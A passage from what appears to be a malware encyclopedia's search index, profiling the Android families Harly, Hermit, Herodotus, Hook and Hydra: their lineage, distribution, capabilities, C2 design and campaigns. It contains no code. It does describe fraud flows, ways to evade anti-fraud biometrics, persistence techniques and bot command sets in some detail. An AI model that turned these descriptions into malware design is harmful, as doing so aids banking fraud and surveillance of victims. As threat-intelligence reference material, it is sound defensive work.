Trojan Subscriber"},{"location":"malware/families/harly/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky classified Harly as part of the Joker/Bread ecosystem based on functional similarity: both families silently subscribe victims to paid services through WAP billing and premium SMS. The key lineage difference is architectural. Joker variants typically act as droppers that download their payload from C2 servers at runtime. Harly embeds the complete payload within the APK itself, encrypted inside assets or native libraries, and decrypts it locally on launch.</p> <p>HUMAN Security's Satori team tracked Harly's evolution and uncovered 95 additional malicious apps on Google Play during their investigation. Their analysis revealed the threat actors behind Harly have adopted Rust and Go for the native library loaders, though their usage of these languages appears limited to payload decryption and loading rather than implementing core fraud logic.</p>"},{"location":"malware/families/harly/#distribution","title":"Distribution","text":"<p>Harly distributes exclusively through Google Play using trojanized functional apps. The operators download legitimate apps, inject malicious code, re-upload them under different developer accounts and names, and maintain the original app functionality to avoid negative reviews.</p> Attribute Details Store Google Play Store Infected apps 190+ identified Total downloads 4.8M+ (conservative estimate) App categories Games, flashlights, wallpapers, camera filters, ringtones, utilities Review evasion Apps retain original functionality; malicious behavior is silent <p>The apps function as advertised. A user who downloads a Harly-infected flashlight app gets a working flashlight. The subscription fraud occurs entirely in the background without any visible indication.</p>"},{"location":"malware/families/harly/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/harly/#subscription-fraud-flow","title":"Subscription Fraud Flow","text":"Step Action 1 App launches, native library (Rust or Go) decrypts embedded DEX payload 2 Decrypted DEX file loaded via DexClassLoader 3 Payload contacts C2 to receive subscription target list 4 Opens subscription page in invisible WebView 5 JavaScript injection auto-fills victim's phone number 6 Intercepts confirmation SMS via NotificationListenerService 7 Extracts PIN/OTP from notification or SMS 8 Submits confirmation code to complete enrollment 9 Hides confirmation notification from victim <p>Harly handles two confirmation methods:</p> <ul> <li>SMS confirmation: The <code>NotificationListenerService</code> reads the incoming verification SMS, extracts the code, and programmatically submits it</li> <li>Phone call confirmation: For services that confirm via automated call, the trojan can initiate calls to specific numbers and confirm subscriptions through the call flow</li> </ul>"},{"location":"malware/families/harly/#data-collection","title":"Data Collection","text":"Data Purpose Device info Fingerprinting for operator analytics Mobile network/carrier Determines which subscription services are available SIM MCC/MNC Country and carrier identification for targeting Installed apps Unknown, possibly for avoiding conflicts with other toll fraud malware"},{"location":"malware/families/harly/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/harly/#payload-architecture","title":"Payload Architecture","text":"<p>Unlike Joker's dropper model, Harly packages everything locally:</p> <pre><code>APK\n\u251c\u2500\u2500 lib/\n\u2502   \u2514\u2500\u2500 [arch]/\n\u2502       \u2514\u2500\u2500 libloader.so          (Rust or Go native library)\n\u251c\u2500\u2500 assets/\n\u2502   \u2514\u2500\u2500 [encrypted_payload]       (encrypted DEX file, disguised extension)\n\u2514\u2500\u2500 classes.dex                   (stub loader, minimal code)\n</code></pre> <p>The native library in <code>lib/</code> handles decryption of the asset file. Once decrypted, the result is a DEX file containing the full subscription fraud SDK. The stub <code>classes.dex</code> loads the native library and triggers decryption on app start.</p>"},{"location":"malware/families/harly/#native-library-rustgo","title":"Native Library (Rust/Go)","text":"<p>HUMAN Security's analysis found that threat actors use Rust and Go to build the native loader libraries. The use of compiled native code for the loader serves two purposes:</p> <ol> <li>Static analysis tools focused on Dalvik bytecode cannot inspect the decryption logic</li> <li>Rust and Go binaries are harder to reverse engineer than standard JNI C/C++ libraries</li> </ol> <p>The threat actors' Rust and Go proficiency appears limited to the loader component. The actual fraud logic in the decrypted DEX is standard Java/Kotlin.</p>"},{"location":"malware/families/harly/#c2-communication","title":"C2 Communication","text":"<p>Harly contacts a C2 server after the payload is decrypted and loaded. The C2 provides:</p> <ul> <li>List of subscription services to target</li> <li>Subscription page URLs</li> <li>JavaScript injection scripts for form filling</li> <li>Configuration updates</li> </ul> <p>The C2 address is embedded in the encrypted payload, not in the outer APK, so it is only visible after decryption.</p>"},{"location":"malware/families/harly/#country-targeting","title":"Country Targeting","text":"<p>Like Joker, Harly checks the device's MCC/MNC to determine if the victim's carrier supports the targeted subscription services. Kaspersky noted that some analyzed samples only operated with Thai mobile operators, though the family targets multiple regions globally.</p>"},{"location":"malware/families/harly/#target-regions","title":"Target Regions","text":"<p>Harly targets regions with active WAP billing and premium SMS infrastructure:</p> Region Notes Southeast Asia Thailand confirmed as a primary target; Indonesia, Malaysia also targeted Europe Multiple Western European carriers targeted Middle East Carriers with WAP billing support <p>Target selection is dynamic, controlled by C2 configuration rather than hardcoded in the app.</p>"},{"location":"malware/families/harly/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020-2022: Over 190 Harly-infected apps accumulate 4.8M+ downloads on Google Play before Kaspersky publishes their analysis in September 2022, leading to removal of identified apps.</p> <p>2022, September: Kaspersky names and documents the Harly family, distinguishing it from Joker by its embedded payload architecture and detailing the invisible WebView subscription mechanism.</p> <p>2022, October: PolySwarm integrates Harly detection and publishes a summary correlating Kaspersky's findings with additional variant telemetry.</p> <p>2023: HUMAN Security's Satori team publishes their investigation, uncovering 95 additional malicious apps and documenting the Rust/Go native loader evolution. Collaboration with Google leads to removal of identified apps from the Play Store.</p> <p>2023: Kaspersky later identified Fleckpe, a related subscription trojan family using native library droppers, found in 11 Play Store apps with 620,000+ downloads.</p> <p>2023-present: New variants continue to appear on Google Play. The family adapts by rotating developer accounts and modifying the native loader to evade updated Play Protect signatures. Kaspersky's 2022 mobile threat report lists Harly among the most prevalent subscription trojans on Android, and the family has been independently reverse engineered by researchers confirming the continued evolution of decryption techniques.</p>"},{"location":"malware/families/hermit/","title":"Hermit","text":"<p>Hermit is a modular commercial spyware developed by Italian firm RCS Lab S.p.A. and distributed through ISP-level network injection. Its defining operational characteristic: the target's mobile data connection is disabled (with ISP cooperation), then an SMS is sent with a link to download an app that will supposedly \"restore\" connectivity. The target installs what appears to be a carrier support app but is actually the Hermit implant. This ISP-assisted delivery model was first documented in Italy and Kazakhstan. Hermit's modular architecture downloads individual surveillance capabilities as separate modules from C2 after initial installation, reducing the implant's static footprint.</p>"},{"location":"malware/families/hermit/#overview","title":"Overview","text":"Attribute Details First Seen 2019 (estimated), publicly documented June 2022 Status Active Type Commercial spyware (government-exclusive) Attribution RCS Lab S.p.A. (Milan, Italy), with Tykelab Srl suspected as a front company Aliases None widely used Platforms Android (primary), iOS"},{"location":"malware/families/hermit/#origin-and-lineage","title":"Origin and Lineage","text":"<p>RCS Lab S.p.A. has operated since 1993, initially providing lawful intercept solutions to Italian law enforcement. The company transitioned into offensive mobile surveillance tools, positioning itself in the same market as NSO Group and FinFisher but with a lower profile.</p> <p>Lookout first published their discovery of Hermit in June 2022, identifying the implant through samples that impersonated telecommunications apps. Google TAG subsequently published a companion analysis confirming the ISP-assisted delivery mechanism and attributing the spyware to RCS Lab.</p> <p>Lookout linked RCS Lab to a suspected front company called Tykelab Srl, a telecommunications solutions company headquartered in the same Italian cities (Milan and Rome). The connection was established through shared SSL certificates on C2 infrastructure: one IP used for Hermit C2 had an SSL certificate shared with another IP whose certificate directly named \"RCS\" as the organization and \"Tykelab\" as the organizational unit.</p>"},{"location":"malware/families/hermit/#distribution","title":"Distribution","text":"<p>Hermit's ISP-assisted delivery is its most distinctive feature and represents a capability that requires government-level access to telecommunications infrastructure.</p>"},{"location":"malware/families/hermit/#isp-level-network-injection","title":"ISP-Level Network Injection","text":"<p>The attack flow, as documented by Google TAG:</p> <ol> <li>The operator (with ISP cooperation) disables the target's mobile data connection</li> <li>The target receives an SMS message appearing to come from their mobile carrier</li> <li>The message claims there is a connectivity issue and provides a link to download an app that will \"fix\" the problem</li> <li>The target, unable to use mobile data and believing the carrier is helping, downloads and installs the APK</li> <li>The app, branded as the carrier's support tool, is actually the Hermit implant</li> <li>Mobile data is restored, reinforcing the belief that the app worked</li> </ol> <p>This delivery method exploits a realistic scenario: users experiencing connectivity issues naturally trust messages from their carrier. The ISP's involvement makes the pretext convincing, because the connectivity problem is real.</p>"},{"location":"malware/families/hermit/#app-impersonation","title":"App Impersonation","text":"<p>Hermit samples analyzed by Lookout impersonated applications from:</p> Impersonated Entity Country Samsung Generic Vivo Generic Oppo Generic Mobile carrier apps (specific to target ISP) Italy, Kazakhstan <p>Each sample uses the legitimate branding and UI of the impersonated company, including icons, splash screens, and app names.</p>"},{"location":"malware/families/hermit/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/hermit/#core-implant","title":"Core Implant","text":"<p>The initial Hermit APK is relatively lightweight. It establishes persistence and C2 communication, then downloads surveillance modules on demand.</p> Core Capability Implementation Persistence Registers as device administrator, uses alarm-based scheduling to maintain execution C2 communication HTTPS with certificate pinning to C2 servers Module loading Downloads additional modules as DEX files or native libraries from C2 Root exploitation Attempts to gain root privileges using known Android exploits Firebase integration Uses Google Firebase for some C2 coordination (Google revoked Hermit's Firebase account upon discovery)"},{"location":"malware/families/hermit/#downloadable-modules","title":"Downloadable Modules","text":"<p>Each surveillance capability is implemented as a separate module downloaded post-installation. Lookout documented the following modules:</p> Module Function Camera Capture photos and video from front and rear cameras Microphone Record ambient audio Call recording Record voice calls Contacts Exfiltrate contact list SMS Read and exfiltrate SMS messages Location GPS tracking and cell tower positioning Photos Access and exfiltrate photo library Email Read email from device accounts Calendar Exfiltrate calendar events Browser Extract bookmarks, history, and search data Clipboard Monitor and capture clipboard contents File manager Browse and exfiltrate files from device storage App list Enumerate installed applications Call log Extract call history Notifications Intercept and read notifications Audio recording Record calls and VoIP conversations Screen Capture screenshots <p>The modular design means the initial implant has a small static footprint, making it harder to detect through signature-based scanning. Modules are only downloaded when the operator tasks a specific capability, so a device compromised for contact exfiltration may never receive the camera module.</p>"},{"location":"malware/families/hermit/#ios-variant","title":"iOS Variant","text":"<p>Google TAG documented an iOS variant that abused Apple enterprise certificates to sideload outside the App Store. The iOS version included six exploits (four known, two zero-day at the time of discovery): CVE-2021-30883 and CVE-2021-30983 were the zero-days, both iOS kernel vulnerabilities. Apple subsequently revoked the abused enterprise certificates.</p>"},{"location":"malware/families/hermit/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/hermit/#exploit-chains","title":"Exploit Chains","text":"<p>Google TAG noted that RCS Lab's Android implant requests permissions that grant access to SMS, camera, microphone, and other sensitive data. When installed on a device where the user grants these permissions, no exploit is strictly necessary. For deeper access (root), the implant bundles known Android kernel exploits.</p> <p>On iOS, the exploit chain includes:</p> CVE Type Notes CVE-2021-30883 Kernel (IOMobileFrameBuffer) 0-day at time of use CVE-2021-30983 Kernel 0-day at time of use, analyzed by Google Project Zero"},{"location":"malware/families/hermit/#persistence","title":"Persistence","text":"<p>The Android implant achieves persistence through multiple mechanisms:</p> <ul> <li>Device administrator registration</li> <li><code>RECEIVE_BOOT_COMPLETED</code> broadcast receiver to restart on boot</li> <li>Alarm-based scheduling to periodically check C2 for commands</li> <li>Foreground service with persistent notification (sometimes disguised as a system notification)</li> </ul>"},{"location":"malware/families/hermit/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Hermit C2 servers use HTTPS with specific TLS certificate patterns that enabled Lookout and Google TAG to fingerprint and map the infrastructure. The C2 protocol supports:</p> <ul> <li>Module download and installation</li> <li>Tasking (which modules to activate, what data to collect)</li> <li>Data exfiltration (encrypted uploads over HTTPS)</li> <li>Implant updates and reconfiguration</li> </ul>"},{"location":"malware/families/hermit/#anti-analysis","title":"Anti-Analysis","text":"<p>Compared to FinSpy's extensive obfuscation, Hermit's anti-analysis techniques are relatively conventional:</p> <ul> <li>String encryption</li> <li>Dynamic module loading (reduces static analysis surface)</li> <li>Certificate pinning on C2 connections</li> <li>Self-removal capability if analysis environment detected</li> </ul>"},{"location":"malware/families/hermit/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Country Context Year Source Italy Used in an anti-corruption operation by Italian authorities 2019 Lookout Kazakhstan Government deployment against domestic targets, with ISP cooperation from Kazakh telecom providers 2022 Lookout, Google TAG Syria Northern Syria deployment, likely by a government actor Unknown Lookout <p>The Kazakhstan deployment drew the most attention because it involved a government deploying commercial spyware against its own citizens with ISP-level cooperation, during a period of domestic political unrest.</p>"},{"location":"malware/families/hermit/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>2019: Hermit is reportedly used in Italy as part of a law enforcement anti-corruption operation. Lookout later identifies samples from this period.</p> <p>April 2022: Lookout detects new Hermit samples in the wild and begins analysis.</p> <p>June 16, 2022: Lookout publishes \"Hermit: Italian Spyware Discovered\", documenting the modular architecture, ISP-assisted delivery, and linking the spyware to RCS Lab and Tykelab through infrastructure analysis.</p> <p>June 23, 2022: Google TAG publishes their analysis, confirming Lookout's findings and adding detail on the ISP injection mechanism. TAG notes that ISPs disabled target mobile data connectivity before sending the malicious SMS. Google begins notifying affected Android users and revokes Hermit's Firebase account. Apple revokes the abused enterprise certificates for the iOS variant.</p> <p>June 2022: Google updates Play Protect to block Hermit from executing on Android devices.</p> <p>2022-present: Google TAG includes RCS Lab in their broader reporting on commercial surveillance vendors (CSVs), warning that companies like RCS Lab are stockpiling zero-day vulnerabilities. TAG's 2024 reporting notes that CSVs were responsible for 20 out of 25 zero-days discovered being exploited in the wild in 2023.</p>"},{"location":"malware/families/herodotus/","title":"Herodotus","text":"<p>Herodotus is an Android banking trojan discovered by ThreatFabric in October 2025, sold as a malware-as-a-service (MaaS) platform on underground forums by a threat actor using the handle \"K1R0.\" Its standout feature is a human behavior mimicry system that introduces natural typing delays, variable input speeds, and randomized interaction patterns during remote control sessions to evade anti-fraud behavioral biometric systems. Reverse engineering reveals code-level connections to Brokewell through shared obfuscation techniques and a dynamically loaded Brokewell module, though Herodotus is a distinct threat with its own operator and distribution model rather than a direct evolution.</p>"},{"location":"malware/families/herodotus/#overview","title":"Overview","text":"Attribute Details First Seen October 2025 Status Active Type Banking trojan, MaaS, device-takeover Aliases None known Attribution Threat actor \"K1R0\" (underground forum handle) Distribution MaaS model, active campaigns in Italy and Brazil"},{"location":"malware/families/herodotus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Herodotus in October 2025 while tracking new threats on underground forums. The malware was being advertised as a MaaS platform by \"K1R0,\" who offered it to affiliates for conducting banking fraud campaigns.</p> <p>Reverse engineering of Herodotus samples revealed significant code-level connections to Brokewell, a banking trojan discovered by ThreatFabric in April 2024 and attributed to the developer \"Baron Samedit Marais.\" The two families share obfuscation techniques, and Herodotus dynamically loads a Brokewell module at runtime. Despite these technical links, Herodotus operates under a different threat actor, uses a different distribution model (MaaS versus direct operation), and introduces novel capabilities not present in Brokewell. This pattern suggests that Brokewell's codebase was adopted, licensed, or forked by the K1R0 operator to build a new product rather than representing a linear evolution of the original malware.</p>"},{"location":"malware/families/herodotus/#distribution","title":"Distribution","text":"Vector Details MaaS platform Sold to affiliates on underground forums by \"K1R0\" Affiliate-driven Individual operators distribute through their own channels Active campaigns Observed targeting users in Italy and Brazil <p>As a MaaS operation, Herodotus follows the same model as families like Octo and Hook. The developer provides the malware, C2 infrastructure, and builder tools. Affiliates purchase access and handle distribution through their own methods, which may include sideloading, phishing, or dropper apps. ThreatFabric observed active campaigns targeting Italy and Brazil at the time of discovery, indicating at least two distinct affiliate operations.</p>"},{"location":"malware/families/herodotus/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/herodotus/#core-features","title":"Core Features","text":"Capability Implementation Device-takeover Full interactive remote control of infected devices Human behavior mimicry Simulates natural typing delays and variable input speeds during remote sessions Overlay attacks WebView-based inject screens for credential harvesting Accessibility abuse Leverages accessibility services for device interaction and data capture Remote control Real-time device control through screen streaming and command execution"},{"location":"malware/families/herodotus/#human-behavior-mimicry","title":"Human Behavior Mimicry","text":"<p>The defining innovation in Herodotus is its approach to evading behavioral biometric anti-fraud systems. Modern banking apps and fraud detection platforms analyze how a user interacts with the device, measuring typing speed, touch pressure patterns, swipe velocity, and input cadence. When a remote-control trojan operates a device, the interaction patterns are typically mechanical: uniform delays between inputs, constant speeds, and perfectly precise tap coordinates. Behavioral biometric systems flag these robotic patterns as anomalous.</p> <p>ThreatFabric documented how Herodotus addresses this by introducing controlled randomness into its remote control actions:</p> <ol> <li>Typing is performed character by character with variable delays between keystrokes, mimicking natural human typing rhythm</li> <li>Input speed varies across different fields and sessions, avoiding the constant cadence of automated input</li> <li>Touch interactions include slight coordinate variations and timing inconsistencies consistent with human imprecision</li> <li>Pauses and hesitations are injected between actions to simulate human decision-making</li> </ol> <p>This technique represents an escalation in the arms race between device-takeover malware and behavioral analytics defenses, moving beyond simply controlling a device to controlling it in a way that appears human.</p>"},{"location":"malware/families/herodotus/#device-takeover","title":"Device-Takeover","text":"<p>Herodotus provides affiliates with full device-takeover capability, allowing operators to interact with the victim's device as if physically holding it. This enables on-device fraud (ODF) where transactions are initiated from the victim's own device within authenticated banking sessions, bypassing new-device detection and device fingerprinting controls.</p>"},{"location":"malware/families/herodotus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/herodotus/#brokewell-module-loading","title":"Brokewell Module Loading","text":"<p>The most significant technical finding from ThreatFabric's reverse engineering is the dynamic loading of a Brokewell module. At runtime, Herodotus decrypts and loads a module that shares code and obfuscation patterns with the Brokewell banking trojan. This module provides core banking trojan functionality while Herodotus layers its own innovations, particularly the behavior mimicry system, on top.</p>"},{"location":"malware/families/herodotus/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Shared obfuscation Uses obfuscation techniques also found in Brokewell samples Dynamic loading Core banking module loaded at runtime rather than bundled statically Behavioral evasion Human mimicry specifically designed to defeat behavioral analytics"},{"location":"malware/families/herodotus/#maas-infrastructure","title":"MaaS Infrastructure","text":"<p>As a MaaS platform, Herodotus provides affiliates with:</p> <ul> <li>Builder tools for generating customized APKs</li> <li>C2 infrastructure for managing infected devices</li> <li>Operator panels for conducting remote sessions</li> <li>Inject kits for targeting specific banking applications</li> </ul>"},{"location":"malware/families/herodotus/#target-regions","title":"Target Regions","text":"Period Primary Targets October 2025 Italy, Brazil <p>ThreatFabric observed active campaigns in Italy and Brazil at the time of discovery. As a MaaS platform, targeting is expected to expand as additional affiliates adopt the service and launch campaigns in their regions of focus.</p>"},{"location":"malware/families/herodotus/#notable-campaigns","title":"Notable Campaigns","text":"<p>October 2025: ThreatFabric disclosed Herodotus as a new MaaS banking trojan sold by \"K1R0\" on underground forums. Active campaigns were identified in Italy and Brazil. The malware's human behavior mimicry during remote control sessions was highlighted as a novel evasion technique targeting behavioral biometric anti-fraud systems. Code analysis revealed connections to Brokewell through shared obfuscation and a dynamically loaded module.</p>"},{"location":"malware/families/herodotus/#related-families","title":"Related Families","text":"Family Relationship Brokewell Shares obfuscation techniques and code structures. Herodotus dynamically loads a Brokewell module at runtime, indicating code reuse or licensing from Brokewell's developer. Octo Comparable MaaS banking trojan with device-takeover capability, though Octo does not implement behavioral mimicry."},{"location":"malware/families/hook/","title":"Hook","text":"<p>Hook is the most feature-complete family in the Cerberus lineage, combining the banking trojan foundations of Ermac with VNC-like screen streaming, a full RAT, file system access, and ATS (Automated Transfer System) capabilities. Announced in January 2023 by the same \"DukeEugene\" threat actor behind Ermac, Hook represents the current state of the art for Cerberus-derived Android malware. After DukeEugene's departure and the source code sale in mid-2023, Hook proliferated rapidly, with over 200 new C2 servers detected in the final months of 2023 alone.</p>"},{"location":"malware/families/hook/#overview","title":"Overview","text":"Attribute Details First Seen January 2023 Status Active, widely deployed post-leak Type Banking trojan + RAT (MaaS) Attribution \"DukeEugene\" (original), multiple operators post-leak Aliases HookBot Source Built on Ermac codebase; source code sold May 2023 for $70,000, fully leaked October 2023 Rental Price $7,000/month (pre-leak)"},{"location":"malware/families/hook/#origin-and-lineage","title":"Origin and Lineage","text":"<p>DukeEugene advertised Hook on January 12, 2023, claiming it was written from scratch. ThreatFabric's analysis immediately disputed this, identifying Hook as an Ermac fork with added functionality. NCC Group later confirmed this definitively: all 30 commands available in Ermac exist in Hook with near-identical code implementation. Hook adds 38 new commands on top of the Ermac base.</p> <p>The lineage is direct and well-documented:</p> <pre><code>Cerberus (2019-2020)\n  \u2514\u2500\u2500 Source leaked September 2020\n        \u2514\u2500\u2500 Ermac (2021-2022), DukeEugene\n              \u2514\u2500\u2500 Hook (2023-present), DukeEugene\n</code></pre> <p>DukeEugene offered Hook at $7,000/month, positioning it as the premium successor to Ermac's $5,000/month rental. On April 19, 2023, DukeEugene announced he was leaving for military service and closing the project. Two days prior, the coder posted the source code for sale at $70,000. By May 11, 2023, the source was reportedly sold. The full source code leaked publicly by October 2023, triggering an explosion in HookBot deployments across the threat landscape.</p>"},{"location":"malware/families/hook/#distribution","title":"Distribution","text":"<p>Hook reaches devices through the same channels established by its predecessors, with expanded use of Google Play droppers.</p> Vector Details Google Play droppers Benign-looking apps that pass Play Protect screening, then download the Hook payload after a delay period Phishing sites Fake app download pages mimicking banking, delivery, and browser update sites Smishing SMS campaigns directing victims to phishing domains Telegram channels Distribution through Telegram groups and channels Third-party stores APKs hosted on unofficial Android app markets <p>Post-leak distribution expanded significantly. With the builder panel and C2 code freely available, setting up a Hook operation became trivial: Silent Push documented that the leaked source allows operators to deploy a fully functional C2 server and generate disguised Hook APKs within minutes.</p>"},{"location":"malware/families/hook/#capabilities","title":"Capabilities","text":"<p>Hook's capability set is a superset of Ermac's, with the additions focused on device takeover and on-device fraud.</p>"},{"location":"malware/families/hook/#inherited-from-ermac-all-30-commands","title":"Inherited from Ermac (All 30 Commands)","text":"Capability Implementation Overlay attacks WebView-based injects for 468+ banking and crypto apps SMS interception Read, send, redirect SMS for OTP theft Contact harvesting Exfiltrate device contacts Keylogging Accessibility-based keystroke capture App listing Enumerate installed packages Account theft Steal accounts via <code>AccountManager</code> Push notifications Lure users into opening target apps App cache clearing Force re-authentication to capture fresh credentials Open URL Launch arbitrary URLs"},{"location":"malware/families/hook/#new-in-hook-38-additional-commands","title":"New in Hook (38 Additional Commands)","text":"Capability Implementation VNC/screen streaming Real-time screen content streamed to operator via WebSocket UI interaction Operator can tap, swipe, type, and navigate the device remotely Full Device Take Over (DTO) Complete fraud chain from PII exfiltration through transaction execution without additional channels File manager Browse, download, and upload files on the device file system WhatsApp extraction Exfiltrate all WhatsApp messages from the victim device Front camera capture Silently take a photo using the front-facing camera Google cookie theft Steal cookies from Google login sessions Crypto seed phrase theft Expanded support for extracting recovery seeds from cryptocurrency wallets ATS framework Automated Transfer System for executing fraudulent transactions without operator intervention Phone location tracking Real-time GPS tracking of the infected device Gesture simulation Perform swipe gestures (swipe up, scroll to specific element) for navigating banking apps programmatically <p>The VNC-like capability is Hook's defining feature. By streaming the screen and allowing real-time interaction, operators can perform full Device Take Over: logging into banking apps, initiating transfers, handling 2FA challenges, and completing transactions, all from the C2 panel. This places Hook alongside Octo and Hydra as families capable of complete on-device fraud.</p>"},{"location":"malware/families/hook/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/hook/#communication-protocol","title":"Communication Protocol","text":"<p>The most significant architectural change from Ermac is Hook's communication layer. NCC Group's analysis documents the shift:</p> Aspect Ermac Hook Protocol HTTP WebSocket (Socket.IO) + HTTP Encryption AES-256-CBC + Base64 AES-256-CBC + Base64 (same scheme) C2 URL pattern Random URLs ending in <code>.php/</code> WebSocket connection for real-time commands; HTTP for data exfiltration Real-time capability Polling-based Persistent bidirectional channel <p>Hook uses Socket.IO for WebSocket communication, enabling the persistent bidirectional connection required for VNC streaming and real-time UI interaction. The encryption mechanism remains the same as Ermac: data is encrypted with AES-256-CBC and then Base64 encoded. HTTP is still used alongside WebSocket for bulk data exfiltration (contacts, SMS, files).</p>"},{"location":"malware/families/hook/#vnc-implementation","title":"VNC Implementation","text":"<p>Hook's VNC-like feature works through the Android Accessibility Service:</p> <ol> <li>The accessibility service captures screen content and transmits it to the C2 over WebSocket</li> <li>The operator views the live screen in the C2 admin panel</li> <li>Operator commands (taps, swipes, text input) are sent back over WebSocket</li> <li>The accessibility service translates these into <code>AccessibilityNodeInfo</code> actions and <code>dispatchGesture</code> calls on the device</li> <li>The loop continues at sufficient frame rate for interactive operation</li> </ol> <p>This approach does not require screen recording permissions or <code>MediaProjection</code>: the accessibility service has inherent access to the UI tree and can both read content and perform actions.</p>"},{"location":"malware/families/hook/#ats-automated-transfer-system","title":"ATS (Automated Transfer System)","text":"<p>Hook's ATS capability automates the fraud chain that would otherwise require manual operator intervention via VNC:</p> <ol> <li>Extract credentials from overlay capture</li> <li>Open the real banking app via accessibility</li> <li>Navigate to the transfer screen using programmatic gestures</li> <li>Fill in transfer details (recipient, amount) from C2 configuration</li> <li>Handle 2FA challenges by intercepting SMS or reading authenticator codes</li> <li>Confirm the transaction</li> </ol> <p>ATS reduces operator workload and increases fraud throughput by executing transfers without human involvement during the transaction itself.</p>"},{"location":"malware/families/hook/#bot-commands-selected-new-commands","title":"Bot Commands (Selected New Commands)","text":"Command Action <code>screenStream</code> Begin VNC screen streaming over WebSocket <code>screenClick</code> Perform tap at specified coordinates <code>screenSwipe</code> Perform swipe gesture <code>screenType</code> Input text at focused field <code>fileManager</code> List directory contents on device <code>fileDownload</code> Download file from device to C2 <code>fileUpload</code> Upload file from C2 to device <code>getWhatsApp</code> Extract WhatsApp message database <code>takePhoto</code> Capture photo via front camera <code>getCookies</code> Steal browser/Google session cookies <code>getSeedPhrase</code> Extract cryptocurrency wallet recovery seeds <code>getLocation</code> Return device GPS coordinates"},{"location":"malware/families/hook/#obfuscation-and-anti-analysis","title":"Obfuscation and Anti-Analysis","text":"<p>Hook inherits Ermac's obfuscation baseline and adds:</p> Technique Details Blowfish string encryption Inherited from Ermac AES-256-CBC C2 encryption Inherited from Ermac Class/method renaming Standard obfuscation Dynamic C2 resolution Encrypted C2 addresses resolved at runtime Multi-stage dropper Play Store apps delay payload delivery to pass scanning"},{"location":"malware/families/hook/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Hook targets the broadest set of financial applications in the Cerberus lineage. ThreatFabric reported 468 banking app targets across multiple continents:</p> Region Countries North America United States, Canada Western Europe Spain, UK, France, Italy, Portugal Eastern Europe Poland, Turkey Asia-Pacific Australia Cryptocurrency (global) MetaMask, Trust Wallet, Coinbase, Binance, Crypto.com, Blockchain.com <p>The US, Spain, and Australia have the highest concentration of targeted financial apps. Post-leak, individual operators have expanded the target list with custom injects for regional institutions.</p>"},{"location":"malware/families/hook/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 12, 2023: DukeEugene announced Hook on underground forums, advertising it at $7,000/month. ThreatFabric published their analysis identifying Hook as an Ermac fork with RAT capabilities, disputing the developer's claim of a from-scratch build. The Hacker News covered the discovery.</p> <p>April 19, 2023: DukeEugene announced project closure, citing military service. The source code was posted for sale at $70,000.</p> <p>May 11, 2023: Source code reportedly sold. The coder requested the sale thread be closed.</p> <p>September 2023: NCC Group published a detailed technical comparison of Ermac and Hook, confirming shared codebase and documenting all 38 new commands. The Hacker News reported on the expanded analysis.</p> <p>October 2023: The full Hook source code, including the builder panel, leaked publicly. This triggered a proliferation of HookBot C2 infrastructure.</p> <p>Late 2023: Silent Push identified over 200 new HookBot C2 servers deployed in the months following the leak. Their investigation uncovered 24 active DukeEugene-linked control panels administering Ermac, Hook, and related variants. Hook was the most prolific Android banking malware family of 2023, targeting 468 banking applications.</p> <p>2024-present: Hook derivatives continue to emerge. With both the Ermac and Hook source codes publicly available, new operators build on either codebase, blurring the boundary between the two families. The combination of VNC, RAT, ATS, and traditional overlay attacks in a single freely available package makes Hook the most accessible full-featured Android banking trojan ever leaked.</p> <p>August 2025, Hook v3: Zimperium zLabs identified Hook v3 with 107 remote commands (38 new beyond Hook v1/v2). New capabilities include ransomware-style lockscreen overlays, fake NFC/payment card overlays for card data collection, lockscreen bypass via deceptive PIN prompts, transparent overlays for silent gesture capture, and real-time device streaming. The v3 variant was distributed via GitHub-hosted malicious APKs. Unused RabbitMQ infrastructure in the code suggests a future C2 channel evolution. Hook v3 represents a convergence of banking trojan and ransomware capabilities in a single package.</p>"},{"location":"malware/families/hydra/","title":"Hydra","text":"<p>Hydra is one of the longest-running Android banking trojan operations, active since 2019 and still operational through an affiliate-based MaaS model. Originally tracked as BianLian (unrelated to the BianLian ransomware group), Hydra combines overlay injection, full Accessibility Service abuse, screen streaming with remote interaction, and on-device fraud capabilities. Its operators rent infrastructure to multiple threat actor groups, making it one of the most broadly deployed mobile banking threats in terms of active affiliates. ThreatFabric reported it as the most prolific Android banking trojan of 2022.</p>"},{"location":"malware/families/hydra/#overview","title":"Overview","text":"Property Value First Seen Early 2019 (dropper component active since 2018 as BianLian) Last Seen / Status Active, MaaS operation ongoing Type Banking trojan, RAT, on-device fraud Attribution Russian-speaking operators; rented to affiliates via underground forums Aliases BianLian (ThreatFabric's original name), Android/BianLian"},{"location":"malware/families/hydra/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric coined the name BianLian, referencing the Chinese theatrical art of rapidly swapping face masks, to describe a dropper family that first appeared in 2018. The dropper masqueraded as utility apps (currency calculators, device cleaners, discount apps) and initially served as a delivery mechanism for other banking trojans, including Anubis.</p> <p>The operators then developed their own banking trojan payload, building on experience gained from distributing other families. This payload became known as Hydra. The relationship between BianLian (the dropper) and Hydra (the banking payload) is tightly coupled: BianLian droppers deliver Hydra payloads, and the same operator group manages both components.</p> <p>Hydra shares some design patterns with the broader BankBot/Anubis lineage. Malpedia notes that BianLian/Hydra shares roots with Anubis and BankBot, though the codebase has diverged substantially through years of independent development.</p>"},{"location":"malware/families/hydra/#distribution","title":"Distribution","text":"<p>Hydra distribution relies on a multi-layered dropper pipeline:</p> <p>Google Play droppers: BianLian droppers have repeatedly reached Google Play, disguised as functional apps with legitimate ratings. ThreatFabric documented how the operators maintained a steady upload cadence, replacing removed apps with new variants. The apps delivered working functionality to maintain user trust and store ratings.</p> <p>Fake app stores and phishing: Cyble identified campaigns 